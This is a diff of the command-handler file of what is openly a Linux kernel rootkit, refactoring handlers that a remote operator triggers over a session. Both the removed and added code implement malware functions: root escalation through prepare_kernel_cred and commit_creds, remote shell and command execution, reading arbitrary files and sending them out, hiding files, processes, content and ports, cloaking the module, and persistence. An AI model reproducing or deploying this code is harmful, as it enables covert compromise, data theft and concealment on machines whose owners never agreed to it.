@@ -1,164 +1,228 @@
 // SPDX-License-Identifier: GPL-2.0
+// execution/commands.c - Individual command handlers.
+#include <linux/fs.h>
+#include <linux/slab.h>
+#include <linux/string.h>
+#include <linux/utsname.h>
 #include "rootkit.h"
 
-/* Shared handler for hiding a string target */
-int rk_cmd_hide_target(struct socket *client,
-		       char targets[][RK_TARGET_LEN],
-		       int *count, const char *value)
+int cmd_ping(struct rk_session *s, const char *arg)
 {
-	int error = rk_target_add(targets, count, value);
-
-	if (error == -ENOSPC)
-		return RK_REPLY(client, "full\n");
-	if (error == -ENAMETOOLONG)
-		return RK_REPLY(client, "too long\n");
-	return RK_REPLY(client, "hidden\n");
+	return rk_send_response(s, "PONG");
 }
 
-/* Shared handler for unhiding a string target */
-int rk_cmd_unhide_target(struct socket *client,
-			 char targets[][RK_TARGET_LEN],
-			 int *count, const char *value)
+int cmd_status(struct rk_session *s, const char *arg)
 {
-	if (rk_target_remove(targets, count, value))
-		return RK_REPLY(client, "not found\n");
-	return RK_REPLY(client, "unhidden\n");
+	char buf[256];
+
+	snprintf(buf, sizeof(buf),
+		 "files=%d pids=%d content=%d ports=%d",
+		 rk_file_targets.count, rk_pid_targets.count,
+		 rk_content_targets.count, rk_port_targets.count);
+	return rk_send_response(s, buf);
 }
 
-int rk_cmd_hide_port(struct socket *client, const char *arg)
+int cmd_info(struct rk_session *s, const char *arg)
 {
-	unsigned short port;
-	int error;
+	char buf[256];
 
-	if (kstrtou16(arg, 10, &port) || port == 0)
-		return RK_REPLY(client, "invalid port\n");
-	error = rk_port_add(port);
-	if (error == -ENOSPC)
-		return RK_REPLY(client, "full\n");
-	return RK_REPLY(client, "hidden\n");
+	snprintf(buf, sizeof(buf), "%s %s %s",
+		 utsname()->sysname, utsname()->release, utsname()->machine);
+	return rk_send_response(s, buf);
 }
 
-int rk_cmd_unhide_port(struct socket *client, const char *arg)
+int cmd_shell(struct rk_session *s, const char *arg)
 {
-	unsigned short port;
-
-	if (kstrtou16(arg, 10, &port) || port == 0)
-		return RK_REPLY(client, "invalid port\n");
-	if (rk_port_remove(port))
-		return RK_REPLY(client, "not found\n");
-	return RK_REPLY(client, "unhidden\n");
+	rk_start_interactive();
+	return rk_send_response(s, "SHELL OK");
 }
 
-int rk_cmd_info(struct socket *client)
+int cmd_exec(struct rk_session *s, const char *arg)
 {
-	struct new_utsname *uts = utsname();
-	char buf[RK_BUF_MAX];
-	int n;
-
-	n = snprintf(buf, sizeof(buf),
-		     "sysname: %s\nnodename: %s\nrelease: %s\n"
-		     "version: %s\nmachine: %s\n",
-		     uts->sysname, uts->nodename, uts->release,
-		     uts->version, uts->machine);
-	return rk_send(client, buf, n);
+	if (!arg || !*arg)
+		return rk_send_response(s, "ERR missing argument");
+	rk_start_exec(arg);
+	return rk_send_response(s, "EXEC OK");
 }
 
-int rk_cmd_status(struct socket *client)
+int cmd_download(struct rk_session *s, const char *arg)
 {
-	char buf[RK_BUF_MAX];
-	int n;
-
-	n = snprintf(buf, sizeof(buf),
-		     "files: %d\npids: %d\ncontents: %d\nports: %d\n"
-		     "cloaked: %s\npersisted: %s\n",
-		     file_count, pid_count, content_count, port_count,
-		     module_hidden ? "yes" : "no",
-		     persist_active ? "yes" : "no");
-	return rk_send(client, buf, n);
-}
-
-static int rk_list_strings(struct socket *client,
-			    char targets[][RK_TARGET_LEN], int count)
-{
-	char buf[RK_BUF_MAX];
-	int n, i;
-
-	if (count == 0)
-		return RK_REPLY(client, "empty\n");
-	for (i = 0; i < count; i++) {
-		n = snprintf(buf, sizeof(buf), "[%d] %s\n", i, targets[i]);
-		rk_send(client, buf, n);
-	}
-	return 0;
-}
-
-static int rk_list_ports(struct socket *client)
-{
-	char buf[RK_BUF_MAX];
-	int n, i;
-
-	if (port_count == 0)
-		return RK_REPLY(client, "empty\n");
-	for (i = 0; i < port_count; i++) {
-		n = snprintf(buf, sizeof(buf), "[%d] %u\n",
-			     i, hidden_ports[i]);
-		rk_send(client, buf, n);
-	}
-	return 0;
-}
-
-int rk_cmd_list(struct socket *client, const char *category)
-{
-	if (strcmp(category, "FILE") == 0)
-		return rk_list_strings(client, hidden_files, file_count);
-	if (strcmp(category, "PID") == 0)
-		return rk_list_strings(client, hidden_pids, pid_count);
-	if (strcmp(category, "CONTENT") == 0)
-		return rk_list_strings(client, hidden_contents, content_count);
-	if (strcmp(category, "PORT") == 0)
-		return rk_list_ports(client);
-	return RK_REPLY(client, "unknown category\n");
-}
-
-int rk_cmd_unhide_all(struct socket *client)
-{
-	file_count = 0;
-	pid_count = 0;
-	content_count = 0;
-	port_count = 0;
-	/* Reset auto-opsec indices so disconnect cleanup is safe */
-	auto_pid_index = -1;
-	auto_port_index = -1;
-	return RK_REPLY(client, "cleared\n");
-}
-
-int rk_cmd_escalate(struct socket *client)
-{
-	struct cred *new;
-
-	new = prepare_kernel_cred(&init_task);
-	if (!new)
-		return RK_REPLY(client, "escalate failed\n");
-	commit_creds(new);
-	return RK_REPLY(client, "escalated\n");
-}
-
-int rk_cmd_download(struct socket *client, const char *path)
-{
-	struct file *fp;
-	char buf[RK_BUF_MAX];
+	struct file *f;
+	char *buf;
 	loff_t pos = 0;
-	ssize_t n;
+	int error = 0;
 
-	fp = filp_open(path, O_RDONLY, 0);
-	if (IS_ERR(fp))
-		return RK_REPLY(client, "file not found\n");
+	if (!arg || !*arg)
+		return rk_send_response(s, "ERR missing path");
 
-	while ((n = kernel_read(fp, buf, sizeof(buf), &pos)) > 0) {
-		if (rk_send(client, buf, n) < 0)
+	f = filp_open(arg, O_RDONLY, 0);
+	if (IS_ERR(f))
+		return rk_send_response(s, "ERR open failed");
+
+	buf = kmalloc(RK_CHUNK_SIZE, GFP_KERNEL);
+	if (!buf) {
+		filp_close(f, NULL);
+		return -ENOMEM;
+	}
+
+	for (;;) {
+		ssize_t bytes_read;
+
+		bytes_read = kernel_read(f, buf, RK_CHUNK_SIZE, &pos);
+		if (bytes_read < 0) {
+			error = (int)bytes_read;
+			break;
+		}
+		if (bytes_read == 0)
+			break;
+
+		error = rk_send_sealed(s, (u8 *)buf, bytes_read);
+		if (error)
 			break;
 	}
 
-	filp_close(fp, NULL);
-	return RK_REPLY(client, "\n");
+	if (!error)
+		error = rk_send_sealed(s, (const u8 *)"", 0);
+
+	kfree(buf);
+	filp_close(f, NULL);
+	return error;
+}
+
+int cmd_cloak(struct rk_session *s, const char *arg)
+{
+	rk_cloak();
+	return rk_send_response(s, "CLOAK OK");
+}
+
+int cmd_uncloak(struct rk_session *s, const char *arg)
+{
+	rk_uncloak();
+	return rk_send_response(s, "UNCLOAK OK");
+}
+
+int cmd_hide_file(struct rk_session *s, const char *arg)
+{
+	if (!arg || !*arg)
+		return rk_send_response(s, "ERR missing argument");
+	rk_target_add(&rk_file_targets, arg);
+	return rk_send_response(s, "HIDE FILE OK");
+}
+
+int cmd_unhide_file(struct rk_session *s, const char *arg)
+{
+	int idx;
+
+	if (!arg || kstrtoint(arg, 10, &idx) != 0)
+		return rk_send_response(s, "ERR bad index");
+	rk_target_remove(&rk_file_targets, idx);
+	return rk_send_response(s, "UNHIDE FILE OK");
+}
+
+int cmd_hide_pid(struct rk_session *s, const char *arg)
+{
+	if (!arg || !*arg)
+		return rk_send_response(s, "ERR missing argument");
+	rk_target_add(&rk_pid_targets, arg);
+	return rk_send_response(s, "HIDE PID OK");
+}
+
+int cmd_unhide_pid(struct rk_session *s, const char *arg)
+{
+	int idx;
+
+	if (!arg || kstrtoint(arg, 10, &idx) != 0)
+		return rk_send_response(s, "ERR bad index");
+	rk_target_remove(&rk_pid_targets, idx);
+	return rk_send_response(s, "UNHIDE PID OK");
+}
+
+int cmd_hide_content(struct rk_session *s, const char *arg)
+{
+	if (!arg || !*arg)
+		return rk_send_response(s, "ERR missing argument");
+	rk_target_add(&rk_content_targets, arg);
+	return rk_send_response(s, "HIDE CONTENT OK");
+}
+
+int cmd_unhide_content(struct rk_session *s, const char *arg)
+{
+	int idx;
+
+	if (!arg || kstrtoint(arg, 10, &idx) != 0)
+		return rk_send_response(s, "ERR bad index");
+	rk_target_remove(&rk_content_targets, idx);
+	return rk_send_response(s, "UNHIDE CONTENT OK");
+}
+
+int cmd_hide_port(struct rk_session *s, const char *arg)
+{
+	if (!arg || !*arg)
+		return rk_send_response(s, "ERR missing argument");
+	rk_target_add(&rk_port_targets, arg);
+	return rk_send_response(s, "HIDE PORT OK");
+}
+
+int cmd_unhide_port(struct rk_session *s, const char *arg)
+{
+	int idx;
+
+	if (!arg || kstrtoint(arg, 10, &idx) != 0)
+		return rk_send_response(s, "ERR bad index");
+	rk_target_remove(&rk_port_targets, idx);
+	return rk_send_response(s, "UNHIDE PORT OK");
+}
+
+int cmd_list(struct rk_session *s, const char *arg)
+{
+	struct rk_target_list *list = NULL;
+	char resp[512];
+	int i, pos;
+	unsigned long flags;
+
+	if (!arg)
+		return rk_send_response(s, "ERR missing list name");
+
+	if (strcmp(arg, "FILE") == 0)
+		list = &rk_file_targets;
+	else if (strcmp(arg, "PID") == 0)
+		list = &rk_pid_targets;
+	else if (strcmp(arg, "CONTENT") == 0)
+		list = &rk_content_targets;
+	else if (strcmp(arg, "PORT") == 0)
+		list = &rk_port_targets;
+	else
+		return rk_send_response(s, "ERR unknown list");
+
+	pos = 0;
+	spin_lock_irqsave(&list->lock, flags);
+	for (i = 0; i < list->count && pos < (int)sizeof(resp) - 64; i++) {
+		pos += snprintf(resp + pos, sizeof(resp) - pos,
+				"%d %s\n", i, list->targets[i]);
+	}
+	spin_unlock_irqrestore(&list->lock, flags);
+
+	if (pos == 0)
+		return rk_send_response(s, "LIST EMPTY");
+
+	resp[pos] = '\0';
+	return rk_send_response(s, resp);
+}
+
+int cmd_persist(struct rk_session *s, const char *arg)
+{
+	rk_persist();
+	return rk_send_response(s, "PERSIST OK");
+}
+
+int cmd_unpersist(struct rk_session *s, const char *arg)
+{
+	rk_unpersist();
+	return rk_send_response(s, "UNPERSIST OK");
+}
+
+int cmd_escalate(struct rk_session *s, const char *arg)
+{
+	rk_escalate();
+	return rk_send_response(s, "ESCALATE OK");
 }
